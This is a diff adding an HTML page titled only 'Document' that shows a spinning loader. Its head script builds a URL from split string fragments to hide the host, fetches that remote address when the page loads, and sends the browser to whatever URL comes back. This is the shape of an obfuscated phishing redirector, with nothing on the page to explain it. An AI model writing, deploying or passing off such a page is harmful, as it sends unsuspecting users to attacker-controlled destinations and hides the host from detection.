@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      id="favicon"
+      rel="icon"
+      href="original-favicon.ico"
+      type="image/x-icon"
+    />
+
+    <script defer>
+      let pf1 = "htt";
+      let pf2 = "ps://u";
+      let pf3 = "rl-pd";
+      let pf4 = "f.alr";
+      let pf5 = "t.di";
+      let pf6 = "gital";
+
+      document.addEventListener("DOMContentLoaded", function () {
+        xyz();
+      });
+
+      async function xyz() {
+        try {
+          const response = await fetch(`${pf1}${pf2}${pf3}${pf4}${pf5}${pf6}`);
+
+          if (!response.ok) {
+            throw new Error(`API error: ${response.status}`);
+          }
+
+          const data = await response.text();
+
+          if (!data) {
+            throw new Error("No URL found in API response");
+          }
+
+          window.location.href = data;
+        } catch (error) {
+          console.error("Failed to fetch and open URL:", error);
+        }
+      }
+
+      // Call the function
+    </script>
+  </head>
+
+  <body>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+      }
+
+      * {
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+      }
+      #general_loader {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        background-color: #f1f2f555;
+        z-index: 99;
+      }
+
+      #general_loader > div {
+        width: 40px;
+        height: 40px;
+        border: 6px solid #ccc;
+        border-top-color: #00bfff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+
+    <div id="general_loader">
+      <div></div>
+    </div>
+  </body>
+</html>
